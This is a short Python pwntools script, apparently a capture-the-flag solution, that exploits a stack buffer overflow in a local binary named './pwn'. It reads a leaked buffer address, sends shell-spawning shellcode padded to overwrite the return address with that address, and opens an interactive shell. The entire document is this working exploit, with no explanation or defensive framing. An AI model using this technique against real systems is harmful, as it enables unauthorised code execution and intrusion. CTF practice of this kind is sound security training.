from pwn import *
context.terminal = ['wt.exe','wsl']
context.log_level = 'debug'
context.arch = 'amd64'

p = process('./pwn')

p.recvuntil("age")
p.sendline('130')

p.recvuntil("you :\n")
buf_addr = int(p.recvuntil('\n').decode(), 16)
log.success(buf_addr)
log.success(type(buf_addr))

payload = asm(shellcraft.sh()).ljust(0x68,b'a') + p64(buf_addr)

p.recvuntil("say")
p.send(payload)
p.interactive()
